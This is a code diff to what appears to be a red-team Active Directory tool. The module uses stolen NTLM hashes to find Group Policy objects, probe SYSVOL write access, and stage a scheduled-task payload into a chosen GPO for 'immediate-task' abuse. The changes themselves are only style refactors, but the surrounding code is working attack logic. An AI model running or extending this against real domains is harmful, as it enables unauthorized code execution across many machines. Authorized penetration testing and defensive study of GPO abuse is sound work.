@@ -8,7 +8,7 @@ into the GPO directory for immediate-task abuse patterns.
 from __future__ import annotations
 
 import json
-from pathlib import PureWindowsPath
+from contextlib import suppress
 from typing import Any
 
 from ldap3 import SUBTREE
@@ -32,7 +32,7 @@ GPO_ATTRS = [
 ]
 
 
-def _smb_connect(target: Target, host: str):
+def _smb_connect(target: Target, host: str) -> Any:
     from impacket.smbconnection import SMBConnection
 
     lm, nt = target.lm_nt_hashes()
@@ -169,14 +169,10 @@ class GpoSysvol:
                             smb.writeFile(tid, fid, b"adaf-attack write probe\n")
                             smb.closeFile(tid, fid)
                             item["sysvol_writable"] = True
-                            try:
+                            with suppress(Exception):  # noqa: BLE001
                                 smb.deleteFile(share, probe_name.replace("/", "\\"))
-                            except Exception:  # noqa: BLE001
-                                pass
                             writable_sysvol.append(item)
-                            console.print(
-                                f"  [red]WRITABLE SYSVOL[/red]  {display}  {unc}"
-                            )
+                            console.print(f"  [red]WRITABLE SYSVOL[/red]  {display}  {unc}")
                         except Exception as exc:  # noqa: BLE001
                             item["sysvol_writable"] = False
                             item["sysvol_error"] = f"write: {exc}"
@@ -212,9 +208,7 @@ class GpoSysvol:
         # Optional stage of scheduled task XML into a specific GPO
         stage_result = None
         if force and stage_gpo and payload_text:
-            stage_result = self._stage_task(
-                target, gpos, stage_gpo, payload_text, session
-            )
+            stage_result = self._stage_task(target, gpos, stage_gpo, payload_text, session)
 
         conn.unbind()
         result = {
@@ -287,7 +281,9 @@ class GpoSysvol:
             smb.closeFile(tid, fid)
             smb.disconnectTree(tid)
             smb.logoff()
-            console.print(f"  [red]STAGED[/red] → \\\\{host}\\SYSVOL\\{rel_task.replace('/', chr(92))}")
+            console.print(
+                f"  [red]STAGED[/red] → \\\\{host}\\SYSVOL\\{rel_task.replace('/', chr(92))}"
+            )
             return {"ok": True, "path": rel_task, "gpo": match["cn"]}
         except Exception as exc:  # noqa: BLE001
             return {"ok": False, "error": str(exc), "gpo": match["cn"]}
